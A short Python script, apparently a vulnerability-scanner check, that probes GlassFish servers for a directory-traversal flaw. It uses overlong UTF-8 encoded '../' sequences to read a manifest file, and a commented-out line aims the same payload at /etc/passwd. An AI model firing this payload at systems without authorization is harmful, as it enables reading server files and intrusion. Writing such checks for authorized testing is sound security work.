# -*- coding:utf-8 -*-

import requests

def verify(protocol,ip,port):
    #url = 'https://' + str(ip) + ':4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    url = protocol + '://' + ip + ':' + str(port)
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    print('testing if glassfish vul')
    payload = "/theme/META-INF/%c0%ae%c0%ae/META-INF/MANIFEST.MF"
    newurl = url + payload
    try:
        r = requests.get(newurl,headers=headers, timeout=5, verify=False)
        if 'Version' in r.text:
            msg = 'There is a glassfish vul on %s' %ip
            number = 'v3'
            print(msg)
            return True, newurl,number,msg
        else:
            msg = 'There is no glassfish vul'
            number = 'v0'
            return False, newurl,number,msg
    except Exception as e:
        msg = 'safe'
        number = 'v0'
        return False, newurl,number,msg